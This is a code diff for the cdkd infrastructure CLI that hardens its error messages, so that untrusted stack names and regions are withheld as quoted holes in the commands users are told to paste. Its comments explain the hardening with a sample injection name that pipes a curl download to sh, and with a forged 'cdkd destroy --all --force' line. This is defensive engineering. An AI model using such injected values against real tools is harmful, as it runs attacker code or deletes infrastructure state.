@@ -10,6 +10,11 @@ import {
   truncateCodePoints,
 } from '../utils/display-safe.js';
 import {
+  pasteableCommand,
+  type CommandArg,
+  type WithholdReason,
+} from '../utils/pasteable-command.js';
+import {
   commandHole,
   recoveryCommandFlags,
   sanitizeRecoveryValue,
@@ -91,33 +96,45 @@ export { isReadableBag };
  * A logical id does NOT share it: CloudFormation allows 255 characters there
  * (`IDENT_MAX_CODE_POINTS`), and a legitimate 129-to-255-character CDK id cut at
  * 128 renders as a name the record does not hold.
+ *
+ * It is the cap a REGION is DISPLAYED at in this module (`safeRegion`), and
+ * therefore the cap the two `--stack-region` values that sit beside such a
+ * display are GATED at: {@link inspectCommand} and `cli/commands/export.ts`'s
+ * drift-gap report (which is why it is exported) pass it to the shared gate as
+ * `maxCodePoints`, rather than the gate's stack-name default. `gc.ts`, which
+ * displays the whole S3 key rather than a region, keeps that default.
  */
-const SHORT_NAME_MAX_CODE_POINTS = 128;
+export const SHORT_NAME_MAX_CODE_POINTS = 128;
 
 /**
  * The shared explanation, in the terms the reader needs: what is wrong, what
  * to look at, and what NOT to do next.
  *
- * Both identifiers are SANITIZED and THEN SHELL-QUOTED, and the command is
+ * Both identifiers are SANITIZED for the PROSE, and the command beside them is
  * emitted LAST and UNWRAPPED — the shape `lock-contention-message.ts` and
  * `.claude/rules/layout-state-types.md` require of any suggestion a user is
- * meant to paste, for two separate reasons.
+ * meant to paste. Inside the command the RAW values go through the shared
+ * gate ({@link inspectCommand}): named shell-quoted only when exact and plain,
+ * a quoted hole otherwise. Two reasons that is not "sanitized, then quoted":
  *
  * Sanitizing alone is not enough. `displaySafe(..., { asciiOnly: true })` is a
  * printable-ASCII allowlist, so it removes the line- and escape-forgery class
  * but KEEPS `'`, `;`, `|`, `` ` ``, `$` and spaces — and neither name is
  * trusted here, since a stack name reaches the cross-stack read path from an
  * `Fn::GetStackOutput` argument or an S3 key. A name spelled
- * `a'; curl http://x|sh; echo '` would close the quoting and append its own
- * command to the line this text tells the user to RUN.
+ * `a'; curl http://x|sh; echo '` sanitizes to itself; unquoted it would close
+ * the quoting and append its own command to the line this text tells the user
+ * to RUN, and quoted its spelling is what an operator strips — which is why
+ * the gate holes it rather than quoting it.
  *
  * Wrapping the command in `'...'` is not enough either, and is what makes the
  * two compose badly: `shellQuote` does its own quoting, so an outer wrapper
  * produces something unpastable. Hence unwrapped and last.
  *
- * An identifier that sanitizes to EMPTY becomes `UNRENDERABLE` rather than
- * nothing — an empty argument makes `--stack-region` swallow the next flag,
- * turning a remedy into a differently-broken command.
+ * An identifier that sanitizes to EMPTY becomes `UNRENDERABLE` in the prose
+ * rather than nothing, so the sentence names a damaged identity rather than
+ * none; in the command the gate prints a hole for it, since an empty argument
+ * makes `--stack-region` swallow the next flag.
  *
  * MODULE-PRIVATE, and it stayed that way after go-to-k/cdkd#3206's review
  * considered exporting it. `cdkd scrub`'s audited-record refusal needed the
@@ -134,13 +151,15 @@ const SHORT_NAME_MAX_CODE_POINTS = 128;
  * difference is what the command DOES: `cdkd force-unlock` deletes another
  * process's lock, so naming a stack that is not quite the record's is
  * destructive and suppressing is right. The command most texts here end on is
- * `cdkd state show`, which reads; emitting it with a sanitized name leads the
- * reader either to "no state found for ..." or to a sibling record the name
- * now matches, which a read shows them as healthy. Neither changes anything,
- * where emitting NOTHING leaves a broken record with no next step at all. A
- * text that points at a command which WRITES owns the gate at its own site:
- * {@link malformedDestroyResourcesRefusalMessage} names no target unless both
- * identifiers render exactly, and gives `cdkd state orphan` as a template.
+ * `cdkd state show`, which reads, and since go-to-k/cdkd#3436's fold-in
+ * {@link inspectCommand} builds it through the shared `pasteableCommand`
+ * gate: a name sanitizing would change prints as a quoted HOLE, never as its
+ * sanitized spelling (which could select a sibling record the altered name
+ * happens to match) and never as nothing (which leaves a broken record with no
+ * next step at all). A text that points at a command which WRITES owns the
+ * gate at its own site: {@link malformedDestroyResourcesRefusalMessage} names
+ * no target unless both identifiers render exactly, and gives
+ * `cdkd state orphan` as a template.
  */
 function safeIdentifier(value: string, maxCodePoints: number): string {
   // CAPPED as well as sanitized. A stack name can arrive from an S3 key, so a
@@ -197,8 +216,9 @@ function safeIdentifier(value: string, maxCodePoints: number): string {
  * the stack name as a free-typed positional, and the record BODY is a second
  * source when a caller omits the loaded identity. A synthesized stack name is
  * not an exception by itself — a prebuilt cloud assembly's name is read
- * unvalidated — which is why `dropRecordCommand` gates its substitution on
- * {@link rendersExactly} (go-to-k/cdkd#3360, closed by go-to-k/cdkd#3363).
+ * unvalidated — which is why `dropRecordCommand` gates its substitution, now
+ * through the shared gate (go-to-k/cdkd#3360, closed by go-to-k/cdkd#3363;
+ * go-to-k/cdkd#3436).
  */
 export function safeStackName(value: string): string {
   return safeIdentifier(value, STACK_REF_MAX_CODE_POINTS);
@@ -393,11 +413,12 @@ function inspectTail(
  * They are {@link commandHole}'s QUOTED form rather than a bare `<stack>`, and
  * the difference is not cosmetic. A bare `<name>` is two shell redirections:
  * pasted, `<stack` reads stdin from a file and the `>` takes the NEXT WORD as
- * an output target and CREATES it. This template is inert today only because
- * it ends on its second hole, so the trailing `>` faces the newline and bash
- * refuses the line — a property of where the command happens to stop, not a
- * decision anyone made, and it goes away the moment a flag is appended. That
- * is how go-to-k/cdkd#3363 met this shape (M4 of its review). Measured on
+ * an output target and CREATES it. The bare spelling this template once had was
+ * inert only because it ended on its second hole, so the trailing `>` faced the
+ * newline and bash refused the line — a property of where the command happened
+ * to stop, not a decision anyone made, and it would have gone away the moment a
+ * flag was appended. That is how go-to-k/cdkd#3363 met this shape (M4 of its
+ * review). The quoted form redirects nothing, whatever follows it. Measured on
  * go-to-k/cdkd#3436: the quoted form passes both holes through as literal
  * argv (`ARGV: state orphan <stack> --stack-region <region>`).
  */
@@ -464,6 +485,33 @@ function mayNameTargetWithDestructiveRemedy(stackName: string, region: string): 
     isPasteableIdent(region)
   );
 }
+
+/**
+ * Where the three DESTROY withhold arms send the reader for the exact name
+ * (go-to-k/cdkd#3420): {@link malformedDestroyResourcesRefusalMessage},
+ * {@link malformedDestroyOrphansRefusalMessage} and
+ * {@link divergentRecordRegionRefusalMessage}. Completes "List the records as
+ * stored with ".
+ *
+ * `--json`, never `--long`: each arm is reached exactly when the identity did
+ * NOT render exactly, and `--long` renders through `displayIdent`, which TRIMS
+ * — `'prod-api '` lists as `"prod-api"`, a healthy sibling's name, so the
+ * pointer would hand back the very spelling the gate refused. `--json` writes
+ * the raw name through `JSON.stringify`, the reason
+ * {@link withheldIdentityClause} gives for the same pointer. The hole remedy is
+ * that clause's too, deliberately NOT "shell-quote it": the command below each
+ * arm already prints the hole quoted (`'<stack>'`), and shell-quoting INSIDE
+ * those quotes splits a padded name into two words aimed at a different record
+ * (go-to-k/cdkd#3363).
+ *
+ * No `--profile` / `--state-bucket` flags ride on it: these builders take no
+ * `LockRecoveryContext`, and the `Inspect` command beside them carries none
+ * either, so the listing reads the same bucket that command does.
+ */
+const WITHHELD_LISTING_POINTER =
+  `'cdkd state list --json', which writes each name raw rather than sanitized, and act on the ` +
+  `one whose key matches, filling the Inspect command's holes from it — replacing each quoted ` +
+  `hole, quotes included, with the shell-quoted value`;
 
 /**
  * The DESTROY refusal text for the `resources` bag (issue
@@ -585,7 +633,9 @@ function mayNameTargetWithDestructiveRemedy(stackName: string, region: string): 
  * still a bound: a planted multi-kilobyte name is truncated at 1152 and lands
  * in the withhold arm.
  *
- * Identifiers are sanitized and THEN shell-quoted, for the reasons
+ * Identifiers are sanitized in the PROSE and, where a command names one,
+ * gated and shell-quoted ({@link inspectCommand}, behind
+ * {@link mayNameTargetWithDestructiveRemedy}), for the reasons
  * {@link safeIdentifier}'s note gives.
  */
 export function malformedDestroyResourcesRefusalMessage(stackName: string, region: string): string {
@@ -616,8 +666,7 @@ export function malformedDestroyResourcesRefusalMessage(stackName: string, regio
     : `This record's stack name or region does NOT render exactly — what is printed above is a ` +
       `sanitized form, and another record may render identically — so this message names no ` +
       `target and offers no command against one. List the records as stored with ` +
-      `'cdkd state list --long', which prints a name needing sanitizing in quoted form, and act ` +
-      `on the one whose key matches.`;
+      `${WITHHELD_LISTING_POINTER}.`;
   const prose =
     `${detail} This command DELETES state, so it refuses ` +
     `rather than continuing: the resource map IS the list of what to delete, so an unreadable ` +
@@ -807,8 +856,7 @@ export function divergentRecordRegionRefusalMessage(
     : `This record's stack name or region does NOT render exactly — what any surrounding output ` +
       `shows is a sanitized form, and another record may render identically — so this message ` +
       `names no target and offers no command against one. List the records as stored with ` +
-      `'cdkd state list --long', which prints a name needing sanitizing in quoted form, and act ` +
-      `on the one whose key matches. Inspect it with: ${inspectCommand(undefined, undefined)}`;
+      `${WITHHELD_LISTING_POINTER}. Inspect it with: ${inspectCommand(undefined, undefined)}`;
   // The tail says "those resources" only when the opening counted some; on the
   // unreadable-bag arm it has no antecedent, so that arm gets its own wording.
   const cannotTell =
@@ -893,8 +941,10 @@ export function refuseDivergentRecordRegionForDestroy(
  * plausible `--dry-run` plan followed by a refusal the moment the flag comes
  * off would be the worst arm of all.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and gated in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST, for the reasons
+ * {@link safeIdentifier}'s note gives.
  */
 export function malformedDeployResourcesRefusalMessage(
   rawStackName: string,
@@ -1006,9 +1056,10 @@ export type RenderedStateContainer = 'outputs' | 'skippedOutputs' | 'attributes'
  * stable across records. Not `.sort()` — that order is deliberately not
  * alphabetical, and its own JSDoc says so.
  *
- * Both identifiers are sanitized and then shell-quoted, and the command is
- * emitted LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s own note
- * gives.
+ * Both identifiers are sanitized in the PROSE and gated in the command —
+ * named shell-quoted only when the shared gate admits them, a quoted hole
+ * otherwise ({@link inspectCommand}) — and the command is emitted LAST and
+ * UNWRAPPED, for the reasons {@link safeIdentifier}'s own note gives.
  *
  * The container NAMES take {@link safeIdentifier} too — the SAME helper, so
  * they cannot drift from it — but NOT `shellQuote`, because they appear in the
@@ -1069,7 +1120,7 @@ export function malformedRenderedContainersWarning(
  * of `<unrenderable>`. That is why the per-site note is one line — the reason
  * lives here.
  *
- * NORMALISE AT THE BOUNDARY. `dropRecordCommand`, `identityWithheld` and
+ * NORMALISE AT THE BOUNDARY. `dropRecordCommand`, `withheldVerdict` and
  * `orphanInspectClause` each carry their own `=== ''` arm on purpose, so this
  * is not the module's only floor — but a floor in the SHARED helpers was tried
  * here and removed, and the reason is NOT that nothing reaches them: three
@@ -1168,6 +1219,11 @@ export function repairMalformedOutputsForReadOnly(state: StackState): boolean {
   return true;
 }
 
+/** {@link malformedOutputsWarning}'s deploy sentence; its note says why this wording. */
+const DEPLOY_REFUSES_OUTPUTS_SENTENCE =
+  `'cdkd deploy' REFUSES this record when it loads it, over this same unreadable 'outputs' ` +
+  `map, rather than rebuilding the map over it — repair the stored value before deploying.`;
+
 /**
  * The warning a caller of {@link repairMalformedOutputsForReadOnly} emits.
  *
@@ -1182,8 +1238,21 @@ export function repairMalformedOutputsForReadOnly(state: StackState): boolean {
  * operator who reads `ADD` rows for outputs the stack already has needs to know
  * the comparison lost its left-hand side.
  *
- * Identifiers are sanitized and then shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * It also says the DEPLOY refuses this record, as the `properties` warning does
+ * for its container (go-to-k/cdkd#3513) — {@link refuseMalformedOutputs} runs
+ * at the deploy engine's state load on the same predicate this repair takes.
+ * That is not an exit-code nicety: `cdkd diff` confines exit 3 to the
+ * top-level stack (go-to-k/cdkd#3335), so on a nested child this sentence is
+ * the only statement of it. Its own sentence, never the `properties` text's
+ * "Do NOT run 'cdkd deploy'": that prohibition belongs to a record whose
+ * resources cannot be read, and this one's are intact. "When it loads it", not
+ * "the deploy will fail": a deploy skips an unchanged nested-stack row and never
+ * loads that child's state.
+ *
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedOutputsWarning(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1196,7 +1265,8 @@ export function malformedOutputsWarning(rawStackName: string, rawRegion: string)
     `character or element carrying the record's own characters; where it is a number, a boolean ` +
     `or null, it yields no comparison at all. Continuing with it EMPTY: every output this diff ` +
     `resolves is reported as an ADD and no stored key is reported as a REMOVE, which is not the ` +
-    `same as the record holding none. See the stored value with: ` +
+    `same as the record holding none. ${DEPLOY_REFUSES_OUTPUTS_SENTENCE} ` +
+    `See the stored value with: ` +
     inspectCommand(stackName, region)
   );
 }
@@ -1265,8 +1335,10 @@ export function refuseMalformedState(
  * bag published one fabricated export per character into the namespace every
  * other stack's `Fn::ImportValue` binds against.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedOutputsRefusalMessage(
   rawStackName: string,
@@ -1310,8 +1382,10 @@ export function malformedOutputsRefusalMessage(
  * other producer in the region down with it, and the index is best-effort by
  * design.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedExportSourceWarning(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1350,8 +1424,10 @@ export function malformedExportSourceWarning(rawStackName: string, rawRegion: st
  * makes the preview report no key as an export, so a row that would carry
  * `[export]` renders without it.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedExportNamesWarning(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1494,8 +1570,10 @@ export function repairMalformedOrphansForReadOnly(state: StackState): boolean {
  * sees no adoption preview and no orphan warning will conclude the stack has
  * none.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedOrphansWarning(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1525,8 +1603,10 @@ export function malformedOrphansWarning(rawStackName: string, rawRegion: string)
  * resource deletion to `deleteState` having never reported the orphans it could
  * not read.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedOrphansRefusalMessage(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1587,7 +1667,7 @@ export function malformedDestroyOrphansRefusalMessage(stackName: string, region:
       `must be OMITTED or it selects nothing.`
     : `This record's stack name or region does NOT render exactly, so this message names no ` +
       `target and offers no command against one. List the records as stored with ` +
-      `'cdkd state list --long' and act on the one whose key matches.`;
+      `${WITHHELD_LISTING_POINTER}.`;
   const prose =
     `${detail} This command DELETES state, so it refuses rather than continuing: an unreadable ` +
     `container counts as no orphans, so the run would proceed through resource deletion to ` +
@@ -1676,8 +1756,10 @@ export function refuseMalformedOrphans(
  * Reading the bag as empty (the read-only repair) IS that second answer, so
  * the only answer that fabricates nothing and skips no protection is to stop.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedDestroyOutputsRefusalMessage(
   rawStackName: string,
@@ -1747,8 +1829,10 @@ export function refuseMalformedOutputsForDestroy(
  * six-key map ... republished into the shared exports index" would name the
  * wrong record and the wrong blast radius.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedNestedChildOutputsRefusalMessage(
   rawChildStackName: string,
@@ -1826,8 +1910,10 @@ export function refuseMalformedNestedChildOutputs(
  * `hasReadableExportSet` / {@link malformedExportSourceWarning}, so nothing
  * here can launder a record.
  *
- * Identifiers are sanitized and THEN shell-quoted and the command is emitted
- * LAST and UNWRAPPED, for the reasons {@link safeIdentifier}'s note gives.
+ * Identifiers are sanitized in the PROSE and GATED in the command — named
+ * shell-quoted only when the shared gate admits them, a quoted hole otherwise
+ * ({@link inspectCommand}) — and the command is emitted LAST and UNWRAPPED,
+ * for the reasons {@link safeIdentifier}'s note gives.
  */
 export function malformedLocalOutputsWarning(rawStackName: string, rawRegion: string): string {
   // {@link absentIfEmpty} at the boundary, then the shared clause and command.
@@ -1923,9 +2009,11 @@ function stackClause(
  * `pickStackRegion`'s answer, so omitting the region is the wider action. Two
  * opposite precedents in one module; neither is the general rule.
  *
- * **Substitution is GATED on the identity rendering EXACTLY, at
- * `STACK_REF_MAX_CODE_POINTS`** (go-to-k/cdkd#3360, and the M0 finding of the
- * go-to-k/cdkd#3363 review). The synthesized name is not validated: a prebuilt
+ * **Substitution is GATED through the shared `pasteableCommand` gate, the name
+ * at `STACK_REF_MAX_CODE_POINTS` and the region at `SHORT_NAME_MAX_CODE_POINTS`,
+ * the cap its prose renders at** (go-to-k/cdkd#3360, the M0 finding of the
+ * go-to-k/cdkd#3363 review, and go-to-k/cdkd#3436's fold-in, which added the
+ * leading-`-` refusal this module's own exactness copy lacked). The synthesized name is not validated: a prebuilt
  * cloud assembly's manifest reaches `cdkd orphan` unread, so a name `safeIdentifier`
  * would TRIM (`'prod-api '`) substitutes as a healthy sibling's, and one it would
  * TRUNCATE (a 166-code-point nested name at the 128 default) becomes a command
@@ -1933,8 +2021,9 @@ function stackClause(
  * Since go-to-k/cdkd#3359 the legacy shape carries no `--stack-region`, so the
  * name is the ONLY thing narrowing this DELETE. The template arm is the fallback,
  * and the caller says where to take the name from instead
- * ({@link rendersExactly} is the test, shared with the inspect line and the
- * object path).
+ * ({@link orphanIdentityVerdict} is the test, shared with the inspect line and
+ * the withheld-identity clause; the object path keeps {@link rendersExactly},
+ * since a key segment beginning with `-` is still that record's key).
  *
  * `recovery` qualifies EVERY arm, the no-identity template included, the way
  * {@link buildForceUnlockCommand} is qualified, through the same `recoveryCommandFlags`: `cdkd state orphan`
@@ -1962,27 +2051,85 @@ function dropRecordCommand(
   // that do NOT normalise, so a fourth caller added later inherits the floor
   // rather than the defect.
   const known = region === undefined || region === '' ? undefined : region;
-  const regionExact = known === undefined || rendersExactly(known);
-  if (!rendersExactly(stackName) || !regionExact) {
-    // A TEMPLATE, keyed to what IS trusted: an absent region stays absent (the
-    // flag would select nothing on a legacy record), an exact one is kept
-    // (it narrows the delete), only an altered one becomes a hole.
-    const flag =
-      known === undefined
-        ? ''
-        : regionExact
-          ? ` --stack-region ${shellQuote(known)}`
-          : ` --stack-region ${commandHole('region')}`;
-    return [
-      `cdkd state orphan ${commandHole('stack')}${flag}`,
-      ...recoveryCommandFlags(recovery).flags,
-    ].join(' ');
-  }
-  const flag = known === undefined ? '' : ` --stack-region ${shellQuote(known)}`;
+  // A TEMPLATE whenever the gate withholds either value, keyed to what IS
+  // trusted: an absent region stays absent (the flag would select nothing on a
+  // legacy record), a named one is kept (it narrows the delete), only a
+  // withheld one becomes a hole — and a withheld region makes the name a hole
+  // too, since the pair is one identity.
+  return pasteableCommand(
+    'cdkd state orphan',
+    orphanIdentityArgs(stackName, known),
+    recoveryCommandFlags(recovery).flags
+  ).command;
+}
+
+/**
+ * The shared gate's verdict on the identity of every refusal built on
+ * {@link orphanRefusal} — `cdkd orphan`'s `properties`, entry, `attributes`
+ * and `orphans`-list refusals, and the `orphans`-records refusals `cdkd
+ * deploy`, `import`, `rollback`, `scrub` and `destroy` raise
+ * (go-to-k/cdkd#3436's fold-in of this module's own copy): why it WITHHOLDS the
+ * stack name and the region, each `undefined` when it would name it. The drop
+ * command, the `cdkd state show` line and the withheld-identity clause all read
+ * this ONE verdict, so no two of them can disagree about a name (go-to-k/cdkd#3363
+ * review, M0 and M2).
+ *
+ * What the gate adds over the {@link rendersExactly} copy it replaces is two
+ * refusals. The leading `-`: `--all` renders exactly and was SUBSTITUTED, and
+ * Commander reads that argv entry in `cdkd state orphan`'s positional as the
+ * option whatever the quoting. And a value past the cap that ENDS in `...`:
+ * `safeIdentifier` marks a cut with `...`, so `'q'.repeat(1152) + '...'`
+ * compared equal to its own truncation and was named in full, where the gate
+ * measures the cap itself and says `too-long`. The stack name keeps
+ * `STACK_REF_MAX_CODE_POINTS`; the region now takes `SHORT_NAME_MAX_CODE_POINTS`,
+ * the cap its prose renders at (see `orphanRegionArg`), where the copy used
+ * 1152 for both. No `plainIdent`: that would withhold the
+ * go-to-k/cdkd#3359 path from `It's Legacy`, which go-to-k/cdkd#3523 records as
+ * the reason this message is not gated like the template sites.
+ */
+function orphanIdentityVerdict(
+  stackName: string,
+  region: string | undefined
+): { readonly stack: WithholdReason | undefined; readonly region: WithholdReason | undefined } {
+  const { withheld } = pasteableCommand('cdkd state orphan', [
+    { value: stackName, hole: 'stack' },
+    ...(region === undefined ? [] : [orphanRegionArg(region)]),
+  ]);
+  return {
+    stack: withheld.find((w) => w.hole === 'stack')?.reason,
+    region: withheld.find((w) => w.hole === 'region')?.reason,
+  };
+}
+
+/**
+ * The identity arguments of the orphan refusal's two commands. Each VALUE goes
+ * to the gate, which holes whichever it withholds; the one thing added here is
+ * that a withheld REGION makes the name a hole as well, since the pair is one
+ * identity and a name beside an unreadable region may not be this record's.
+ */
+function orphanIdentityArgs(stackName: string, region: string | undefined): CommandArg[] {
+  if (region === undefined) return [{ value: stackName, hole: 'stack' }];
+  const regionWithheld = orphanIdentityVerdict(stackName, region).region !== undefined;
   return [
-    `cdkd state orphan ${shellQuote(stackName)}${flag}`,
-    ...recoveryCommandFlags(recovery).flags,
-  ].join(' ');
+    regionWithheld ? { hole: 'stack' } : { value: stackName, hole: 'stack' },
+    orphanRegionArg(region),
+  ];
+}
+
+/**
+ * The region's argument, at the cap its PROSE renders it at: `safeRegion`
+ * cuts at `SHORT_NAME_MAX_CODE_POINTS`, so a gate at the stack-ref cap would
+ * name a 200-character region in full under a clause showing it cut — the
+ * "borrowing a gate UPWARD" `.claude/rules/state-malformed-containers.md`
+ * forbids, and what `maxCodePoints` exists for (review of go-to-k/cdkd#3973).
+ */
+function orphanRegionArg(region: string): CommandArg {
+  return {
+    flag: '--stack-region',
+    value: region,
+    hole: 'region',
+    opts: { maxCodePoints: SHORT_NAME_MAX_CODE_POINTS },
+  };
 }
 
 /**
@@ -1996,18 +2143,25 @@ function dropRecordCommand(
  * `malformedDestroyResourcesRefusalMessage` uses, reached from a different
  * source.
  *
- * What it covers: every identity the `cdkd orphan` properties refusal builds
- * something PASTEABLE from — the drop command ({@link dropRecordCommand}), the
- * `cdkd state show` line ({@link orphanInspectCommand}) and the object path
- * ({@link orphanInspectClause}) — so no two of them can disagree about a name
- * (go-to-k/cdkd#3363 review, M0 and M2). The shared {@link inspectCommand}
- * stays ungated for its other callers, which offer a read only.
+ * What it covers in the `cdkd orphan` properties refusal: the object path
+ * ({@link orphanInspectClause}). Its two COMMANDS — the drop command
+ * ({@link dropRecordCommand}) and the `cdkd state show` line
+ * ({@link orphanInspectCommand}) — moved onto the shared gate through
+ * {@link orphanIdentityVerdict} (go-to-k/cdkd#3436), which refuses everything
+ * this does plus a leading `-`, a value past the cap ending in `...` (which
+ * this compares equal to its own truncation) and a region of 129 to 1152
+ * characters (the region's own cap is 128); a name beginning with `-` is still a real key,
+ * so the object path may print it while both commands hole it. The shared {@link inspectCommand}
+ * builds through the shared gate for its other callers, which offer a read
+ * only: an altered, capped, empty, option-shaped or non-plain name is a quoted
+ * hole there, never a sanitized spelling.
  *
  * It is NOT the module's gate for a DESTRUCTIVE remedy and must not be unified
  * with one: the three messages that offer a hole TEMPLATE are all stricter,
- * adding {@link isPasteableIdent} (go-to-k/cdkd#3516). This one is weaker on
- * purpose, and the gap is tracked rather than closed (go-to-k/cdkd#3523):
- * {@link dropRecordCommand} SUBSTITUTES, so tightening it here withholds the
+ * adding {@link isPasteableIdent} (go-to-k/cdkd#3516). The orphan refusal's
+ * commands are weaker on purpose — {@link orphanIdentityVerdict} passes no
+ * `plainIdent` — and the gap is tracked rather than closed (go-to-k/cdkd#3523):
+ * {@link dropRecordCommand} SUBSTITUTES, so tightening it withholds the
  * drop command from a legacy record whose name merely needs quoting — the very
  * path go-to-k/cdkd#3359 built, where `cdkd state show` refuses outright and
  * this command is the way out. Measured: `It's Legacy` loses it.
@@ -2039,8 +2193,45 @@ function inspectCommand(stackName: string | undefined, region: string | undefine
     // here would be substituting the untrusted values the clause above drops.
     return `cdkd state show ${commandHole('stack')} --stack-region ${commandHole('region')} --json`;
   }
-  const flag = region === undefined ? '' : ` --stack-region ${shellQuote(safeRegion(region))}`;
-  return `cdkd state show ${shellQuote(safeStackName(stackName))}${flag} --json`;
+  // The SHARED gate since go-to-k/cdkd#3436's fold-in. The local form printed
+  // `shellQuote(safeStackName(...))` -- the SANITIZED spelling, ungated -- so a
+  // name rendering ALTERED was named rather than withheld, and the command then
+  // addressed a different record than the message meant. The rule
+  // `.claude/rules/state-malformed-containers.md` states for this arm is that
+  // nothing here SUBSTITUTES a sanitized spelling: a value the gate refuses
+  // prints as a HOLE rather than as a different name. The arm above is the
+  // one deliberate TEMPLATE, taken when the caller had no name to gate — the
+  // destroy refusals hand it an inexact identity that way.
+  //
+  // BOTH values are held to `plainIdent`: this command sits beside a labelled
+  // line, the shape that rule governs, and exactness alone admits a name with
+  // interior padding that spells a labelled line once the terminal wraps
+  // (`Prod<60 spaces>Migrate with: cdkd destroy --all --force #`) — the
+  // wrap-forge the option exists for (M2 of the go-to-k/cdkd#3764 review).
+  // Real CDK names, `Parent~Child` included, pass `isPasteableIdent`.
+  //
+  // The region keeps ITS cap: this message displays it through `safeRegion`
+  // at `SHORT_NAME_MAX_CODE_POINTS`, and a gate at the stack-name cap names a
+  // 200-character region in full under a clause that renders it cut — the
+  // exact "borrowing a gate UPWARD" the rule file forbids. `maxCodePoints` is
+  // how the gate takes a caller's cap without the caller re-spelling the
+  // comparison.
+  return `${
+    pasteableCommand(
+      'cdkd state show',
+      region === undefined
+        ? [{ value: stackName, hole: 'stack', opts: { plainIdent: true } }]
+        : [
+            { value: stackName, hole: 'stack', opts: { plainIdent: true } },
+            {
+              flag: '--stack-region',
+              value: region,
+              hole: 'region',
+              opts: { plainIdent: true, maxCodePoints: SHORT_NAME_MAX_CODE_POINTS },
+            },
+          ]
+    ).command
+  } --json`;
 }
 
 /**
@@ -2383,9 +2574,11 @@ export function malformedResourcePropertiesRefusalMessage(
  * instruction that dies on `Construct path '...' not found in template`, which
  * is the misstating-the-remedy class this module's own notes record (security
  * review of go-to-k/cdkd#3318). The remedy is now stated with its condition and
- * the two unconditional ways out beside it — hand repair, and
+ * the two template-free ways out beside it — hand repair, and
  * `cdkd state orphan <stack>`, which needs no CDK app and drops the whole
- * record with the live resources left standing.
+ * record with the live resources left standing. The second is not available
+ * for a stack name beginning with `-`, and the message says so for that
+ * record (go-to-k/cdkd#3436, R3 of the go-to-k/cdkd#3973 review).
  *
  * So the recovery-path objection is answered for the common case by the
  * exemption and for the rest by naming commands that do not depend on the
@@ -2524,8 +2717,10 @@ function orphanRefusal(
 
 /**
  * The half-sentence that accompanies a TEMPLATE drop remedy when a stack name
- * WAS known but it, or the region beside it, did not render exactly. The prose
- * above it prints the sanitized spelling, and an operator filling the template
+ * WAS known but {@link orphanIdentityVerdict} withheld it or the region beside
+ * it — for not rendering exactly, for the cap, or for a leading `-`, each with
+ * its own sentence below. For an inexact value the prose above prints the
